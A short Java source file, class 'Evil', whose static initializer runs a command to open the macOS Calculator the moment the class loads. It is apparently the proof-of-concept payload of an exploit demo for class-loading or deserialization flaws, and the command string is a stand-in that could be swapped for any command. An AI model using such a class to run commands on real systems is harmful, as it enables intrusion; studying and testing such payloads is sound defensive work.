package demo;

import java.io.IOException;

public class Evil {
    static{
        try {
            Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
